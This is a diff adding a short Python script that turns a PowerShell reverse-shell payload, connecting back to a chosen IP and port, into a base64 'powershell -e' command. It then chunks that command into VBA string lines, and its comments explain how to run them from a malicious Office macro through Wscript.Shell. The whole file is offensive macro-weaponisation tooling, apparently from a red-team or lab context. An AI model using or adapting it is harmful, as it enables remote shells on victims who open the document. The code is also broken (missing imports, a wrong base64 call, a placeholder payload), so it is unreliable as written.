@@ -1,0 +1,37 @@
+# This script is to encode your PowerShell payload
+# Usage: python3 script.py <ip> <port>
+# Will generate a PowerShell base64 encoded command to input into a macro file
+
+def help():
+	print("USAGE: %s IP PORT" % sys.argv[0])
+	print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
+	exit()
+
+try:
+	(ip, port) = (sys.argv[1], int(sys.argv[2]))
+except:
+	help()
+
+# Visit revshells
+payload = '<put PWSH shellcode here'
+payload = payload % (ip, port)
+
+cmdline = "powershell -e " + base64.encode(payload.encode('utf16')[2:]).decode()
+
+# Uncomment the below line if you want to see this output, otherwise, refer to payload.txt
+
+# print(cmdline + "\n")
+
+str = cmdline
+n=50
+
+# Break it up into maximum string length for VBA
+# Saves the output to a file named payload.txt
+
+for i in range(0,len(str),n):
+	with open("payload.txt", "a") as f:
+		f.write("Str = str+" + '"' + str[i:i+n] + '"\n')
+		# Add a new line
+		
+# Put the output of payload.txt under 'Dim Str As String' under 'Sub MyMacro()'
+# Before the end of macro file add 'CreateObject("Wscript.Shell").Run Str'
